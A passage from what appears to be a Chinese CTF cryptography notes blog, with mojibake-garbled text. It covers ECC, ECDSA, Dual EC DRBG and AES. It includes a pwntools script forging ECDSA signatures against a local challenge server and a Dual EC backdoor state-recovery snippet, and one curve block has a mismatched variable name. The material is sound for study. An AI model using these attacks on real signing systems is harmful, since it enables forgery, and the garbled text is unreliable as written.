$G$ ä¸Šçš„ç¦»æ•£å¯¹æ•°éš¾é¢˜ã€‚ å¯†é’¥ç”Ÿæˆ é€‰å–ä¸€æ¡æ¤­åœ†æ›²çº¿ $\\text{E}_p(a,b)$ï¼Œå°†æ˜æ–‡æ¶ˆæ¯ $m$ åµŒå…¥åˆ°æ›²çº¿ä¸Šçš„ç‚¹ $P_m$ï¼Œå†å¯¹ç‚¹ $P_m$ åšåŠ å¯†å˜æ¢ã€‚ å– $\\text{E}_p(a,b)$ çš„ä¸€ä¸ªç”Ÿæˆå…ƒï¼ˆåŸºç‚¹ï¼‰ $G$ï¼Œ $\\text{E}_p(a,b)$ å’Œ $G$ ä½œä¸ºå…¬å¼€å‚æ•°ã€‚ Aé€‰ $n_A$ ä½œä¸ºå¯†é’¥ï¼Œä»¥ $P_A=n_AG$ ä½œä¸ºå…¬é’¥ã€‚ åŠ å¯†è¿‡ç¨‹ ç”¨æˆ·Bå‘Aå‘é€æ¶ˆæ¯ $P_m$ï¼Œé€‰å–ä¸€ä¸ªéšæœºçš„æ­£æ•´æ•° $k$ï¼Œäº§ç”Ÿä»¥ä¸‹ç‚¹å¯¹ä½œä¸ºå¯†æ–‡ï¼š $C_m=(kG,P_m+kP_A)$ã€‚ è§£å¯†è¿‡ç¨‹ Aä»¥å¯†æ–‡ç‚¹å¯¹ä¸­çš„ç¬¬äºŒä¸ªç‚¹ï¼Œå‡å»ç”¨è‡ªå·±çš„å¯†é’¥ä¸ç¬¬ä¸€ä¸ªç‚¹çš„å€ä¹˜ï¼Œå³ï¼š $P_m+kP_A-n_AkG=P_m+k(n_AG)-n_AkG=P_m$ã€‚ â€‹ ECDSAæ¤­åœ†æ›²çº¿æ•°å­—ç­¾åç®—æ³•ï¼ˆè‹±è¯­ï¼šElliptic Curve Digital Signature Algorithmï¼Œç¼©å†™ï¼šECDSAï¼‰æ˜¯ä¸€ç§åŸºäºæ¤­åœ†æ›²çº¿å¯†ç å­¦çš„å…¬å¼€å¯†é’¥åŠ å¯†ç®—æ³•ã€‚ ECDSAæ˜¯DSAä½œç”¨äºæ¤­åœ†æ›²çº¿çš„ä¸€ä¸ªå˜ç§ç®—æ³•ã€‚Aå’ŒBä»ç„¶ä½¿ç”¨åŒæ ·çš„æ›²çº¿ï¼ŒECDSAéœ€è¦ä½¿ç”¨æ˜æ–‡çš„å“ˆå¸Œç»“æœï¼Œè€Œä¸æ˜¯æ˜æ–‡æœ¬èº«ã€‚å“ˆå¸Œå‡½æ•°çš„é€‰æ‹©å–å†³äºä½¿ç”¨è€…ï¼Œä½†æ˜¯éœ€è¦æ˜ç¡®çš„æ˜¯å¿…é¡»é€‰æ‹©åŠ å¯†å®‰å…¨çš„å“ˆå¸Œå‡½æ•°ã€‚ åœºæ™¯ï¼šAlice æƒ³è¦ä½¿ç”¨å¥¹çš„ç§é’¥ $d_A$ æ¥ç­¾åï¼ŒBob æƒ³ç”¨ Alice çš„å…¬é’¥ $H_A$ è¦éªŒè¯ç­¾åï¼ˆ$H_A=d_AG$ï¼‰ï¼Œåªæœ‰ Alice æ‰èƒ½æä¾›æ­£ç¡®çš„ç­¾åï¼Œè€Œæ¯ä¸ªäººéƒ½å¯ä»¥éªŒè¯ç­¾åã€‚ ç­¾åè¿‡ç¨‹ Aä½¿ç”¨ç®—æ³•æ¥ç­¾åçš„æ­¥éª¤ï¼š é€‰å–ä¸€æ¡æ¤­åœ†æ›²çº¿ $\\text{E}_p(a,b)$ï¼› é€‰å–ä¸€ä¸ªéšæœºæ•° $k\\quad (k\\in[1,n-1])$ (Nonce)ï¼Œ$n$ ä¸º $\\text{E}_p(a,b)$ çš„é˜¶ï¼› é€‰å– $\\text{E}_p(a,b)$ çš„ä¸€ä¸ªåŸºç‚¹ $G$ï¼Œè®¡ç®—ç‚¹ $K=kG$ï¼Œåæ ‡è¡¨ç¤ºä¸º $K=(x_K,y_K)$ï¼› è®¡ç®—æ•°å­— $r=x_K \\bmod n$ï¼› å¦‚æœ $r=0$ï¼Œå¦é€‰ä¸€ä¸ª $k$ å¹¶é‡æ–°è®¡ç®—ï¼› è·å–æ•°æ® $M$ çš„Hashå€¼ï¼Œè®°ä¸º$z=\\text{Hash}(M)$ï¼Œè®¡ç®— $s=k^{-1}(z+rd_A) \\bmod n$ï¼› å¦‚æœ $s=0$ï¼Œå¦é€‰ä¸€ä¸ª $k$ å¹¶é‡æ–°è®¡ç®—ï¼› è¾“å‡ºç­¾å $(r,s)$ã€‚ é€šä¿—çš„è¯´ï¼Œè¿™ä¸ªç®—æ³•ä¸€å¼€å§‹ç”Ÿæˆäº† $k$ï¼Œå¾—ç›Šäºç‚¹ä¹˜ï¼Œ$k$ è¢«éšè—åœ¨äº† $r$ ä¸­ï¼Œç„¶åé€šè¿‡ $s$ çš„ç­‰å¼å°† $r$ ç»‘å®šåˆ°äº†æ¶ˆæ¯æ•£åˆ—å€¼ $z$ ä¸Šã€‚ ä¸ºäº†è®¡ç®— $s$ï¼Œå¿…é¡»è®¡ç®— $k^{-1} \\bmod n$ï¼Œåªæœ‰åœ¨ $n$ æ˜¯ç´ æ•°çš„æƒ…å†µä¸‹æ‰èƒ½ä¿è¯è¿™ä¸€è¿‡ç¨‹ï¼Œå¦‚æœå­ç¾¤çš„é˜¶ä¸æ˜¯ä¸€ä¸ªç´ æ•°ï¼ŒECDSA å°†ä¸èµ·ä½œç”¨ã€‚ éªŒè¯è¿‡ç¨‹ ä¸ºäº†éªŒè¯ç­¾åï¼Œéœ€è¦Açš„å…¬é’¥ $H_A$ã€å“ˆå¸Œå€¼ $z$ å’Œç­¾å $(r,s)$ã€‚ è®¡ç®—æ•´æ•° $u_1=s^{-1}z \\bmod n$ï¼› è®¡ç®—æ•´æ•° $u_2=s^{-1}r \\bmod n$ï¼› è®¡ç®—ç‚¹ $P=u_1G+u_2H_A=(s^{-1}zG+s^{-1}rH_A) \\bmod n=s^{-1}G(z+rd_A) \\bmod n$ï¼› åªæœ‰å½“ $r=x_P \\bmod n$ çš„æ—¶å€™ï¼Œç­¾åæ‰è¢«æˆåŠŸéªŒè¯ã€‚ å‚è€ƒ ECDSAæ•°å­—ç­¾åç®—æ³• ECCæ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼šECDH å’Œ ECDSA æ”»å‡» $k$ å¤ç”¨ï¼ˆå…±äº« $k$ï¼‰ ECDSA: Handle with Care å‚è€ƒDSAæ”»å‡»ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192from gmpy2 import invertfrom hashlib import sha256, sha1from pwn import *from parse import *from pwnlib.util.iters import bruteforceimport string, randomimport ecdsacontext(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)HOST = &quot;127.0.0.1&quot;PORT = 10305r = remote(HOST, PORT)def brute_force(prefix,s): return bruteforce(lambda x:sha256(x+prefix).hexdigest()==s,string.ascii_letters+string.digits,length=4,method=&#x27;fixed&#x27;)def recv(keepends=False): return r.recvline(keepends=keepends).strip()def send(anti, msg): r.sendlineafter(anti, msg)def sendHash(): context = recv() prefix, s = parse(&quot;sha256(XXXX+&#123;&#125;) == &#123;&#125;&quot;,context) proof = brute_force(prefix,s) send(&quot;Give me XXXX:&quot;, proof)def getMessage(): recv() recv() msg1 = recv()[-64:] msg2 = recv()[-64:] return msg1, msg2def calculator(msg1, msg2): curve = ecdsa.curves.SECP256k1 G = curve.generator n = G.order() r = 0 while r == 0: random_k = ecdsa.util.randrange(n) k = random_k % n ks = k + n kt = ks + n if ecdsa.util.bit_length(ks) == ecdsa.util.bit_length(n): p1 = kt * G else: p1 = ks * G r = p1.x() % n h1 = ecdsa.util.string_to_number(sha1(msg1).digest()) % n h2 = ecdsa.util.string_to_number(sha1(msg2).digest()) % n x = ((-(h1 + h2)) * invert(2*r, n)) % n prikey = ecdsa.SigningKey.from_secret_exponent(x, ecdsa.curves.SECP256k1, hashfunc=sha1) pubkey = prikey.get_verifying_key() send(&quot;Please choice your options:&quot;, &quot;3&quot;) send(&quot;Please give me your public_key(hex):&quot;, pubkey.to_string().encode(&#x27;hex&#x27;)) sign = prikey.sign(msg1, k = k) send(&quot;Please choice your options:&quot;, &quot;5&quot;) send(&quot;Please give me the message(hex):&quot;, msg1.encode(&#x27;hex&#x27;)) send(&quot;Please give me the signature(hex):&quot;, sign.encode(&#x27;hex&#x27;)) if &quot;Verify successfully!&quot; in recv(): print (&quot;msg1 verify successfully!&quot;) send(&quot;Please choice your options:&quot;, &quot;5&quot;) send(&quot;Please give me the message(hex):&quot;, msg2.encode(&#x27;hex&#x27;)) send(&quot;Please give me the signature(hex):&quot;, sign.encode(&#x27;hex&#x27;)) if &quot;Verify successfully!&quot; in recv(): print (&quot;msg2 verify successfully!&quot;) send(&quot;Please choice your options:&quot;, &quot;6&quot;) send(&quot;Please give me the signature(hex) of the frist message:&quot;, sign.encode(&#x27;hex&#x27;)) send(&quot;Please give me the signature(hex) of the second message:&quot;, sign.encode(&#x27;hex&#x27;))def main(): sendHash() msg1, msg2 = getMessage() calculator(msg1, msg2) r.recvuntil(&quot;&#125;&quot;) r.close()if __name__ == &#x27;__main__&#x27;: main() $k$ éƒ¨åˆ†æ³„éœ²+å¤šç»„ $(r,s)$ ç­¾å ECDSA: Handle with Care Recovering cryptographic keys from partial Pbctf 2020 - LeaK DownUnderCTF 2020 - impECCable L3HCTF - EzECDSA LLLç®—æ³•ã€‚ $k$ ä½ä½ç›¸åŒ+å¤šç»„ $(r,s)$ ç­¾å GFCTF2021 - Wtfcrypto â€‹ Dual EC DRBGåŒæ¤­åœ†æ›²çº¿ç¡®å®šæ€§éšæœºæ•°å‘ç”Ÿå™¨ï¼ˆDual_EC_DRBGï¼‰ï¼Œä¹Ÿè¢«ç§°ä½œåŒæ¤­åœ†æ›²çº¿éšæœºæ•°å‘ç”Ÿå™¨ï¼Œæ˜¯ä¸€ç§ä½¿ç”¨æ¤­åœ†æ›²çº¿å¯†ç å­¦å®ç°çš„å¯†ç å­¦å®‰å…¨ä¼ªéšæœºæ•°å‘ç”Ÿå™¨ï¼ˆCSPRNGï¼‰ã€‚å®ƒçš„è®¾è®¡è€…æ˜¯ NSAï¼Œ2006 å¹´å®ƒè¢« NIST ä½œä¸ºæ ‡å‡†ï¼Œåˆ° 2014 å¹´è¢«ç§»é™¤ã€‚ æ”»å‡» åé—¨åŸç†ï¼š $P=dQ$ å…³ç³»ä¸­çš„ $d$ å¦‚æœè¢«æ”»å‡»è€…çŸ¥é“äº†ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±å¯ä»¥åˆ©ç”¨ $d$ æ„é€ å‡ºä¹‹åæ¯ä¸€æ­¥çš„ $\\text{state}$ï¼Œä»è€Œå¯ä»¥æˆåŠŸé¢„æµ‹æ¯ä¸€æ­¥çš„ $r_i$ï¼Œè¿™ä¸ªéšæœºæ•°ç”Ÿæˆå™¨ä¹Ÿå°±è¢«æ”»ç ´äº†ã€‚ è®¾æ¯ä¸€æ­¥çš„ $\\text{state}$ ä¸º $s_i$ï¼Œéšæœºæ•°ä¸º $r_i$ï¼Œéšæœºæ•°å¯¹åº”çš„æ¤­åœ†æ›²çº¿ä¸Šçš„ç‚¹ä¸º $R_i$ã€‚ é‚£ä¹ˆå¯¹äºæ”»å‡»è€…æ¥è¯´ï¼Œå·²çŸ¥ $P$ã€$Q$ã€$d$ã€$R_i$ï¼Œè€Œ $s_i$ æœªçŸ¥ã€‚äºæ˜¯æœ‰ï¼š $\\begin{cases} ((s_i \\cdot P)_x \\cdot P)_x &amp; \\rightarrow s_{i+1} \\newline ((s_i \\cdot P)_x \\cdot Q)_x &amp; \\rightarrow r_i \\end{cases}$ æ˜¾ç„¶ï¼Œæˆ‘ä»¬éœ€è¦æ±‚å¾—æŸä¸€æ­¥çš„ $s_i$ï¼Œé‚£ä¹ˆä¹‹åæ¯ä¸€æ­¥çš„ $s_i$ å°±éƒ½çŸ¥é“äº†ï¼Œä»è€Œä¹‹åçš„ $r_i$ æˆ‘ä»¬ä¹Ÿéƒ½å¯ä»¥é¢„æµ‹äº†ã€‚ è€Œè®ºæ–‡é‡Œçš„åé—¨å°±æ˜¯æ„é€  $d \\cdot r_{i-1}$ï¼Œå…¶æ°å¥½æ˜¯ $s_i$ï¼Œäºæ˜¯çœ‹ä¼¼å®‰å…¨çš„ä½“åˆ¶å°±è¢«æ”»ç ´äº†ã€‚ è®° $k_i = (s_i \\cdot P)_x$ï¼Œæœ‰ï¼š $\\begin{align} d \\cdot r_{i-1} &amp; = {(d \\cdot R_{i-1})_x = (d \\cdot k_{i-1} \\cdot Q)_x} = {(k_{i-1} \\cdot d \\cdot Q)_x = (k_{i-1} \\cdot P)_x} = {((s_{i-1} \\cdot P)_x \\cdot P)_x = s_i} \\end{align}$ 12345678910111213141516171819202122232425def do_next(s): sP = s * P r = Integer(sP[0]) s_new = Integer((r * P)[0]) rQ = r * Q return Integer(rQ[0]), s_newdef do_guess(r1): try: rQ1 = E.lift_x(r1) except ValueError: return None sP2 = d * rQ1 s2 = Integer(sP2[0]) r2, s3 = do_next(s2) return r2, s3 for i in tqdm(range(256)): r1_guess = (r1 &lt;&lt; 8) + i res = do_guess(r1_guess) if res: r2_guess, s3 = res if r2_guess &gt;&gt; 8 == r2: r3, s4 = do_next(s3) break å‚è€ƒ Dual EC: A Standardized Back Door UTCTF 2021 - Sleeves â€‹ EC-LCGç»™å‡ºECCçš„7ä¸ªç‚¹çš„ $x$ åæ ‡å€¼ï¼Œæ»¡è¶³ $X_i=X_{i-1}+b$ï¼Œå¾—åˆ°å…³äº $x_b,a,b$ ä¸‰ä¸ªæœªçŸ¥æ•°æœ‰å…³çš„æ–¹ç¨‹ï¼Œä¸€å…±6ä¸ªæ–¹ç¨‹ï¼Œç”¨GrÃ¶bneråŸºæ±‚è§£ $C=kp$ã€‚ å‚è€ƒ PREDICTING THE ELLIPTIC CURVE CONGRUENTIAL GENERATOR RCTF 2022 - IS_THIS_LCG? â€‹ ECDDHPæ¤­åœ†æ›²çº¿ä¸Šçš„DDHé—®é¢˜ï¼ˆElliptic Curve Decisional Diffie-Hellman Problemï¼ŒECDDHPï¼‰ã€‚ åŒçº¿æ€§å¯¹æ»¡è¶³ $e(aG,bG)=e(G,abG)$ã€‚ å¦‚æœéšä¾¿é€‰ä¸€ä¸ªæ¤­åœ†æ›²çº¿ç‚¹ç¾¤ï¼ŒECDDHå‡è®¾é€šå¸¸æ˜¯ä¸æˆç«‹çš„ï¼Œå¹¶ä¸”æ”»å‡»æ–¹æ³•å°±å¾ˆç®€å•ï¼šçœ‹ç­‰å¼ $e(aG,bG)=e(G,abG)$ æ˜¯å¦æˆç«‹ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445# sageDDH_instances = []# curvep = K = GF(p)a = b = E = EllipticCurve(K, (a, b))G = n = G.order()# Embedding degree of the curvek = def solve_ECDDHP(DDH_instances, G, Ep, m, n): &quot;&quot;&quot; Parameters: DDH_instances - list consists of (aG, bG, cG), where aG, bG, cG are EC_point.xy() m - embedding degree of &lt;G&gt; n - G&#x27;s order. &quot;&quot;&quot; sols = [] Fpm.&lt;x&gt; = GF(p^m) Epm = Ep.base_extend(Fpm) G = Epm(G) for ins in DDH_instances: aG, bG, cG = ins aG = Epm(aG); bG = Epm(bG); cG = Epm(cG) # e_aG_bG = aG.weil_pairing(bG, n) e_aG_bG = aG.tate_pairing(bG, n, m) e_G_cG = G.tate_pairing(cG, n, m) if e_aG_bG == e_G_cG: sols.append(True) else: sols.append(False) return solssols = solve_ECDDHP(DDH_instances, G, E, k, n) â€‹ æ ‡å‡†æ¤­åœ†æ›²çº¿NIST P-25612345678910NIST_256 = ( NIST_256_P := 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff, NIST_256_K := GF(NIST_256_P), NIST_256_A := NIST_256_K(0xffffffff00000001000000000000000000000000fffffffffffffffffffffffc), NIST_256_B := NIST_256_K(0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b), NIST_256_CURVE := EllipticCurve(NIST_256_K, (NIST_256_A, NIST_256_B)), NIST_256_GEN := NIST_256_CURVE(0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296, 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5), NIST_256_ORDER := 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551 * 0x1)NIST_256_CURVE.set_order(NIST_256_ORDER) NIST P-51212345678910NIST_521 = ( NIST_521_P := 0x01ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff, NIST_521_K := GF(NIST_521_P), NIST_521_A := NIST_521_K(0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffc), NIST_521_B := NIST_521_K(0x0051953eb9618e1c9a1f929a21a0b68540eea2da725b99b315f3b8b489918ef109e156193951ec7e937b1652c0bd3bb1bf073573df883d2c34f1ef451fd46b503f00), NIST_521_CURVE := EllipticCurve(NIST_521_K, (NIST_521_A, NIST_521_B)), NIST_521_GEN := NIST_521_CURVE(0x00c6858e06b70404e9cd9e3ecb662395b4429c648139053fb521f828af606b4d3dbaa14b5e77efe75928fe1dc127a2ffa8de3348b3c1856a429bf97e7e31c2e5bd66, 0x011839296a789a3bc0045c8a5fb42c7d1bd998f54449579b446817afbd17273e662c97ee72995ef42640c550b9013fad0761353c7086a272c24088be94769fd16650), NIST_521_ORDER := 0x01fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa51868783bf2f966b7fcc0148f709a5d03bb5c9b8899c47aebb6fb71e91386409 * 0x1)NIST_512_CURVE.set_order(NIST_512_ORDER)","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"ECC","slug":"ECC","permalink":"https://lazzzaro.github.io/tags/ECC/"}],"author":"Lazzaro"},{"title":"å—å¯†ç ","slug":"crypto-å—å¯†ç ","date":"2020-11-07T10:37:27.000Z","updated":"2023-11-07T12:17:20.870Z","comments":true,"path":"2020/11/07/crypto-å—å¯†ç /","permalink":"https://lazzzaro.github.io/2020/11/07/crypto-%E5%9D%97%E5%AF%86%E7%A0%81/","excerpt":"","text":"â€‹ å—å¯†ç /åˆ†ç»„å¯†ç åœ¨å¯†ç å­¦ä¸­ï¼Œåˆ†ç»„åŠ å¯†ï¼ˆè‹±è¯­ï¼šBlock cipherï¼‰ï¼Œåˆç§°åˆ†å—åŠ å¯†æˆ–å—å¯†ç ï¼Œæ˜¯ä¸€ç§å¯¹ç§°å¯†é’¥ç®—æ³•ã€‚å®ƒå°†æ˜æ–‡åˆ†æˆå¤šä¸ªç­‰é•¿çš„æ¨¡å—ï¼ˆblockï¼‰ï¼Œä½¿ç”¨ç¡®å®šçš„ç®—æ³•å’Œå¯¹ç§°å¯†é’¥å¯¹æ¯ç»„åˆ†åˆ«åŠ å¯†è§£å¯†ã€‚åˆ†ç»„åŠ å¯†æ˜¯æå…¶é‡è¦çš„åŠ å¯†åè®®ç»„æˆï¼Œå…¶ä¸­å…¸å‹çš„å¦‚AESå’Œ3DESä½œä¸ºç¾å›½æ”¿åºœæ ¸å®šçš„æ ‡å‡†åŠ å¯†ç®—æ³•ï¼Œåº”ç”¨é¢†åŸŸä»ç”µå­é‚®ä»¶åŠ å¯†åˆ°é“¶è¡Œäº¤æ˜“è½¬å¸ï¼Œéå¸¸å¹¿æ³›ã€‚ åˆ†ç»„åŠ å¯†åŒ…å«ä¸¤ä¸ªæˆå¯¹çš„ç®—æ³•ï¼šåŠ å¯†ç®—æ³• $E$ å’Œè§£å¯†ç®—æ³• $D$ï¼Œä¸¤è€…äº’ä¸ºåå‡½æ•°ã€‚æ¯ä¸ªç®—æ³•æœ‰ä¸¤ä¸ªè¾“å…¥ï¼šé•¿åº¦ä¸º $n$ ä½çš„ç»„ï¼Œå’Œé•¿åº¦ä¸º $k$ ä½çš„å¯†é’¥ï¼›ä¸¤ç»„è¾“å…¥å‡ç”Ÿæˆ $n$ ä½è¾“å‡ºã€‚å°†ä¸¤ä¸ªç®—æ³•çœ‹ä½œå‡½æ•°ï¼Œ$K$ è¡¨ç¤ºé•¿åº¦ä¸º $k$ çš„å¯†é’¥ï¼ˆå¯†é’¥é•¿åº¦ï¼‰ï¼Œ$P$ è¡¨ç¤ºé•¿åº¦ä¸º $n$ çš„åˆ†ç»„ï¼Œ$P$ ä¹Ÿè¢«è¡¨ç¤ºä¸ºæ˜æ–‡ï¼Œ$C$ è¡¨ç¤ºå¯†æ–‡ï¼Œåˆ™æ»¡è¶³ï¼š $E_K(P) = C \\; ; \\quad E_K^{-1}(C)=P$ $E_K(P) := E(K,P): \\{0,1\\}^k \\times \\{0,1\\}^n \\rightarrow \\{0,1\\}^n,$ å¯¹äºä»»æ„å¯†é’¥ $K$ï¼Œ$E_K(P)$ æ˜¯è¾“å…¥çš„ç»„çš„ä¸€ä¸ªç½®æ¢å‡½æ•°ï¼Œä¸”å¯é€†åœ°è½åœ¨ $\\{0,1\\}^n$ åŒºé—´ã€‚$E$ çš„åå‡½æ•°ï¼ˆè§£å¯†ç®—æ³•ï¼‰å®šä¹‰ä¸ºï¼š $E_K^{-1}(C) := D_K(C) = D(K,C): \\{0,1\\}^k \\times \\{0,1\\}^n \\rightarrow \\{0,1\\}^n,$ ä¾‹å¦‚ï¼Œä¸€ä¸ªåˆ†ç»„åŠ å¯†ç®—æ³•ä½¿ç”¨ä¸€æ®µ 128 ä½çš„åˆ†ç»„ä½œä¸ºæ˜æ–‡ï¼Œç›¸åº”è¾“å‡º 128 ä½çš„å¯†æ–‡ï¼›è€Œå…¶è½¬æ¢åˆ™å—åŠ å¯†ç®—æ³•ä¸­ç¬¬äºŒä¸ªè¾“å…¥çš„æ§åˆ¶ï¼Œä¹Ÿå°±æ˜¯å¯†é’¥ $k$ã€‚è§£å¯†ç®—æ³•ç±»ä¼¼ï¼Œä½¿ç”¨ 128 ä½çš„å¯†æ–‡å’Œå¯¹åº”çš„å¯†é’¥ï¼Œå¾—åˆ°åŸ 128 ä½çš„æ˜æ–‡ã€‚ æ¯ä¸€ä¸ªå¯†é’¥å®é™…ä¸Šæ˜¯é€‰æ‹©äº† $n$ ä½è¾“å…¥æ’åˆ—çš„ $(2^n)!$ ç§ç»„åˆä¸­çš„ä¸€ç§ã€‚ å¤§å¤šæ•°çš„åˆ†ç»„å¯†ç åœ¨åœ¨åŠ å¯†ç®—æ³•ä¸­ä¼šé‡å¤ä½¿ç”¨æŸä¸€å‡½æ•°è¿›è¡Œå¤šè½®è¿ç®—ï¼Œå…¸å‹çš„è½®æ•°åœ¨4-32æ¬¡ä¹‹é—´ï¼Œæ¯ä¸€è½®çš„å‡½æ•°Rä½¿ç”¨ä¸åŒçš„å­å¯†é’¥ $K_i$ï¼Œç”±åŸå¯†é’¥ç”Ÿæˆï¼Œä½œä¸ºè¾“å…¥ï¼š $M_i = R_{K_i}(M_{i-1})$ å…¶ä¸­ $M_{0}$ æ˜¯æœ€åˆçš„æ˜æ–‡ï¼Œ$M_{i}$ æ˜¯ç¬¬ $i$ è½®åŠ å¯†åçš„å¯†æ–‡ã€‚ â€‹ åˆ†ç±»AESé«˜çº§åŠ å¯†æ ‡å‡†ï¼ˆè‹±è¯­ï¼šAdvanced Encryption Standardï¼Œç¼©å†™ï¼šAESï¼‰ï¼Œåˆç§°RijndaelåŠ å¯†æ³•ï¼Œæ˜¯ç¾å›½è”é‚¦æ”¿åºœé‡‡ç”¨çš„ä¸€ç§åŒºå—åŠ å¯†æ ‡å‡†ã€‚è¿™ä¸ªæ ‡å‡†ç”¨æ¥æ›¿ä»£åŸå…ˆçš„DESï¼Œå·²ç»è¢«å¤šæ–¹åˆ†æä¸”å¹¿ä¸ºå…¨ä¸–ç•Œæ‰€ä½¿ç”¨ã€‚ç»è¿‡äº”å¹´çš„ç”„é€‰æµç¨‹ï¼Œé«˜çº§åŠ å¯†æ ‡å‡†ç”±ç¾å›½å›½å®¶æ ‡å‡†ä¸æŠ€æœ¯ç ”ç©¶é™¢ï¼ˆNISTï¼‰äº2001å¹´11æœˆ26æ—¥å‘å¸ƒäºFIPS PUB 197ï¼Œå¹¶åœ¨2002å¹´5æœˆ26æ—¥æˆä¸ºæœ‰æ•ˆçš„æ ‡å‡†ã€‚ç°åœ¨ï¼Œé«˜çº§åŠ å¯†æ ‡å‡†å·²ç„¶æˆä¸ºå¯¹ç§°å¯†é’¥åŠ å¯†ä¸­æœ€æµè¡Œçš„ç®—æ³•ä¹‹ä¸€ã€‚ è¯¥ç®—æ³•ä¸ºæ¯”åˆ©æ—¶å¯†ç å­¦å®¶Joan Daemenå’ŒVincent Rijmenæ‰€è®¾è®¡ï¼Œç»“åˆä¸¤ä½ä½œè€…çš„åå­—ï¼Œä»¥Rijndaelä¸ºåæŠ•ç¨¿é«˜çº§åŠ å¯†æ ‡å‡†çš„ç”„é€‰æµç¨‹ã€‚ åŠ å¯†æ–¹æ³• ä¸¥æ ¼åœ°è¯´ï¼ŒAESå’ŒRijndaelåŠ å¯†æ³•å¹¶ä¸å®Œå…¨ä¸€æ ·ï¼ˆè™½ç„¶åœ¨å®é™…åº”ç”¨ä¸­ä¸¤è€…å¯ä»¥äº’æ¢ï¼‰ï¼Œå› ä¸ºRijndaelåŠ å¯†æ³•å¯ä»¥æ”¯æŒæ›´å¤§èŒƒå›´çš„åŒºå—å’Œå¯†é’¥é•¿åº¦ï¼šAESçš„åŒºå—é•¿åº¦å›ºå®šä¸º128æ¯”ç‰¹ï¼Œå¯†é’¥é•¿åº¦åˆ™å¯ä»¥æ˜¯128ï¼Œ192æˆ–256æ¯”ç‰¹ï¼›è€ŒRijndaelä½¿ç”¨çš„å¯†é’¥å’ŒåŒºå—é•¿åº¦å‡å¯ä»¥æ˜¯128ï¼Œ192æˆ–256æ¯”ç‰¹ã€‚åŠ å¯†è¿‡ç¨‹ä¸­ä½¿ç”¨çš„å¯†é’¥æ˜¯ç”±Rijndaelå¯†é’¥ç”Ÿæˆæ–¹æ¡ˆäº§ç”Ÿã€‚ å¤§å¤šæ•°AESè®¡ç®—æ˜¯åœ¨ä¸€ä¸ªç‰¹åˆ«çš„æœ‰é™åŸŸå®Œæˆçš„ã€‚ AESåŠ å¯†è¿‡ç¨‹æ˜¯åœ¨ä¸€ä¸ª4Ã—4çš„å­—èŠ‚çŸ©é˜µä¸Šè¿ä½œï¼Œè¿™ä¸ªçŸ©é˜µåˆç§°ä¸ºâ€œä½“ï¼ˆstateï¼‰â€ï¼Œå…¶åˆå€¼å°±æ˜¯ä¸€ä¸ªæ˜æ–‡åŒºå—ï¼ˆçŸ©é˜µä¸­ä¸€ä¸ªå…ƒç´ å¤§å°å°±æ˜¯æ˜æ–‡åŒºå—ä¸­çš„ä¸€ä¸ªByteï¼‰ã€‚ï¼ˆRijndaelåŠ å¯†æ³•å› æ”¯æŒæ›´å¤§çš„åŒºå—ï¼Œå…¶çŸ©é˜µçš„â€œåˆ—æ•°ï¼ˆRow numberï¼‰â€å¯è§†æƒ…å†µå¢åŠ ï¼‰åŠ å¯†æ—¶ï¼Œå„è½®AESåŠ å¯†å¾ªç¯ï¼ˆé™¤æœ€åä¸€è½®å¤–ï¼‰å‡åŒ…å«4ä¸ªæ­¥éª¤ï¼š AddRoundKey çŸ©é˜µä¸­çš„æ¯ä¸€ä¸ªå­—èŠ‚éƒ½ä¸è¯¥æ¬¡å›åˆå¯†é’¥ï¼ˆround keyï¼‰åšXORè¿ç®—ï¼›æ¯ä¸ªå­å¯†é’¥ç”±å¯†é’¥ç”Ÿæˆæ–¹æ¡ˆäº§ç”Ÿã€‚ SubBytes é€è¿‡ä¸€ä¸ªéçº¿æ€§çš„æ›¿æ¢å‡½æ•°ï¼Œç”¨æŸ¥æ‰¾è¡¨çš„æ–¹å¼æŠŠæ¯ä¸ªå­—èŠ‚æ›¿æ¢æˆå¯¹åº”çš„å­—èŠ‚ã€‚ ShiftRows å°†çŸ©é˜µä¸­çš„æ¯ä¸ªæ¨ªåˆ—è¿›è¡Œå¾ªç¯å¼ç§»ä½ã€‚ MixColumns ä¸ºäº†å……åˆ†æ··åˆçŸ©é˜µä¸­å„ä¸ªç›´è¡Œçš„æ“ä½œã€‚è¿™ä¸ªæ­¥éª¤ä½¿ç”¨çº¿æ€§è½¬æ¢æ¥æ··åˆæ¯å†…è”çš„å››ä¸ªå­—èŠ‚ã€‚æœ€åä¸€ä¸ªåŠ å¯†å¾ªç¯ä¸­çœç•¥MixColumnsæ­¥éª¤ï¼Œè€Œä»¥å¦ä¸€ä¸ªAddRoundKeyå–ä»£ã€‚ 123456789101112131415161718192021222324252627282930313233343536//Javaå®ç°import java.io.*;import javax.crypto.spec.SecretKeySpec;import java.security.MessageDigest;import java.util.Arrays;import javax.crypto.Cipher;class test &#123; public static void main (String[] args) throws java.lang.Exception &#123; byte[] plain = &quot;flag&#123;xxxxxxxxx&#125;&quot;.getBytes(); System.out.println(Arrays.toString(plain)); byte[] key = &#123;-114, 62, 98, 26, 54, -7, -59, -47, 55, 88, 18, -1, -99, 116, -51, 62&#125;; SecretKeySpec secretKeySpec = new SecretKeySpec(key, 0, key.length, &quot;AES&quot;); MessageDigest instance = MessageDigest.getInstance(&quot;SHA-256&quot;); instance.reset(); byte[] digest = instance.digest(plain); Cipher instance2 = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); instance2.init(1, secretKeySpec); byte[] cipher = 